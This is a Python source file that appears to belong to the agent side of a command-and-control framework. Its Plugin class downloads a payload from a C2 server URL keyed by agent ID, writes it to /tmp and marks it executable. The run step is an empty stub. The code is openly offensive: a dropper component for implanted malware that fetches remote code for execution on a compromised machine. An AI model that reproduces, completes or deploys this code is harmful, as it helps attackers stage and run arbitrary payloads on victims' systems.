import sys
sys.path.append("comm")

import importlib
import os
import stat

#hard coding transport_Http, TO-DO, propogate CLI module

transportMode = "transport_Http"
transportMode = importlib.import_module(transportMode)

class Plugin:
	pluginId =None
	c2url = None
	pluginpath_dir = "/tmp"
	agent_id = ""

	def __init__(self,id,agent_id,serverAddr,dir=pluginpath_dir):
		self.pluginId =id
		
		self.pluginpath_dir = dir
		self.c2url = serverAddr
		self.agent_id = agent_id

	def downloadPlugin(self):
		serverAddr = self.c2url + "/download/"+ self.agent_id + "/" + self.pluginId
		r = transportMode.sendRequest(serverAddr,{},method="get")
		self.pluginpath_dir = self.pluginpath_dir +"/"+ self.pluginId
		print(self.pluginpath_dir)
		open(self.pluginpath_dir, 'wb').write(r.content)
		os.chmod(self.pluginpath_dir, 0o775)



	def runPlugin(self):
		pass

	




		
